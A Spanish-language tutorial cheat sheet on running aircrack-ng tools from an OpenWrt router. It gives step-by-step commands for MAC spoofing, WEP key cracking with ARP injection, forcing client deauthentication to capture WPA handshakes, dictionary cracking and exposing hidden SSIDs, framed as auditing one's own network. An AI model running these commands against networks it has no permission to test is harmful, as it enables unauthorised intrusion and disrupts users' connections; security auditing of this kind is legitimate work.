# Guía de uso de `airodump-ng` en OpenWrt

Esta guía resume, de forma directa y paso a paso, cómo trabajar con `airodump-ng` en un dispositivo OpenWrt. La idea es que puedas tener un “chuletario” claro para auditar **tu propia red** y documentar el flujo de trabajo.

> ⚠️ Ajusta siempre los valores entre `<...>` (MAC, canales, rutas, etc.) a tu entorno real.

---

## 1. Preparación del entorno

Actualiza los índices de paquetes e instala las herramientas necesarias:

```bash
opkg update
opkg install macchanger
```

Si más adelante necesitas hacer peticiones HTTP desde el router:

```bash
opkg update
opkg install curl
```

---

## 2. Exploración de interfaces y captura básica

Muestra las interfaces Wi-Fi disponibles:

```bash
iw dev
```

Suponiendo que tu interfaz en modo monitor es `phy1-mon0`, puedes iniciar una captura genérica en 5 GHz:

```bash
airodump-ng phy1-mon0 --band a --write /tmp/<capture_prefix>
```

Por ejemplo:

```bash
airodump-ng phy1-mon0 --band a --write /tmp/monitoring_5ghz
```

Si quieres que el fichero de captura se vaya actualizando y que además se genere en varios formatos:

```bash
airodump-ng phy1-mon0 --band a --write /tmp/monitoring_5ghz --update 5 --output-format csv,pcap
```

---

## 3. Cambiar la MAC de la interfaz (spoofing)

Para cambiar la MAC de la interfaz en modo monitor:

```bash
ifconfig phy1-mon0 down
macchanger -m <new_mac_address> phy1-mon0
ifconfig phy1-mon0 up
```

Ejemplo de placeholder:

```bash
macchanger -m AA:BB:CC:DD:EE:FF phy1-mon0
```

---

## 4. Ataque a red WEP (captura de IVs y crack)

> Usa este procedimiento únicamente sobre redes WEP tuyas o de laboratorio, ya que WEP está roto desde hace años y se utiliza solo con fines didácticos.

### 4.1 Capturar paquetes IV de la red WEP

- `<channel>` → canal de la red WEP.
- `<wep_bssid>` → BSSID (MAC del AP).
- `phy1-mon0` → interfaz en modo monitor.

```bash
airodump-ng -c <channel> --bssid <wep_bssid> -w wep_attack phy1-mon0
```

Ejemplo:

```bash
airodump-ng -c 40 --bssid <wep_bssid> -w wep_attack phy1-mon0
```

### 4.2 Inyectar tráfico para acelerar la captura

En otra sesión/terminal, inyecta tráfico ARP para generar más IVs:

- `<wep_bssid>` → misma MAC del AP objetivo.
- `<attack_mac>` → MAC de tu interfaz (spoofeada con `macchanger`, por ejemplo).

```bash
aireplay-ng --arpreplay -b <wep_bssid> -h <attack_mac> phy1-mon0
```

### 4.3 Romper la clave WEP

Cuando tengas suficientes IVs en el fichero `wep_attack-01.cap`, lanza:

```bash
aircrack-ng wep_attack-01.cap
```

---

## 5. Ataque a red WPA/WPA2 (handshake + diccionario)

> De nuevo, pensado para pruebas de laboratorio o auditoría de tu propia red. WPA/WPA2 se basa en capturar el **handshake** y luego probar contraseñas con un diccionario.

### 5.1 Capturar el handshake WPA

- `<channel>` → canal de la red.
- `<wpa_bssid>` → BSSID del AP.

```bash
airodump-ng -c <channel> --bssid <wpa_bssid> -w wpa_attack phy1-mon0
```

Ejemplo:

```bash
airodump-ng -c 40 --bssid <wpa_bssid> -w wpa_attack phy1-mon0
```

### 5.2 Forzar desautenticación de un cliente

- `<wpa_bssid>` → BSSID del AP.
- `<client_mac>` → MAC del cliente conectado.

```bash
aireplay-ng --deauth 10 -a <wpa_bssid> -c <client_mac> phy1-mon0
```

### 5.3 Verificar que el handshake se ha capturado

```bash
aircrack-ng wpa_attack-01.cap
```

### 5.4 Probar claves con un diccionario

- `<wordlist_path>` → ruta al diccionario (lista de contraseñas).
- `<wpa_bssid>` → BSSID del AP.

```bash
aircrack-ng -w <wordlist_path> -b <wpa_bssid> wpa_attack-01.cap
```

Ejemplo:

```bash
aircrack-ng -w /path/to/wordlist.txt -b <wpa_bssid> wpa_attack-01.cap
```

---

## 6. Redes con SSID oculto

### 6.1 Monitorizar redes con SSID oculto

Escanea en un canal concreto para detectar APs con SSID oculto:

```bash
airodump-ng phy1-mon0 --band a --channel <channel>
```

Ejemplo:

```bash
airodump-ng phy1-mon0 --band a --channel 40
```

### 6.2 Esperar reconexiones o forzar desautenticación

- Puedes simplemente dejar `airodump-ng` corriendo y esperar a que algún cliente se conecte.
- O usar desautenticación (como en el caso de WPA) para provocar reconexiones y que el SSID se muestre en claro.

---

## 7. Resumen de placeholders usados

Para mantener tus guías limpias y reutilizables, usa siempre campos genéricos:

- `<new_mac_address>` → MAC que asignas con `macchanger`.
- `<wep_bssid>` → BSSID de la red WEP objetivo.
- `<wpa_bssid>` → BSSID de la red WPA/WPA2 objetivo.
- `<client_mac>` → MAC del cliente víctima (equipo conectado).
- `<attack_mac>` → MAC de tu interfaz en modo monitor.
- `<channel>` → canal en el que opera el AP.
- `<capture_prefix>` → prefijo de los ficheros de captura (`.cap`, `.csv`, etc.).
- `<wordlist_path>` → ruta a tu diccionario de contraseñas.

---
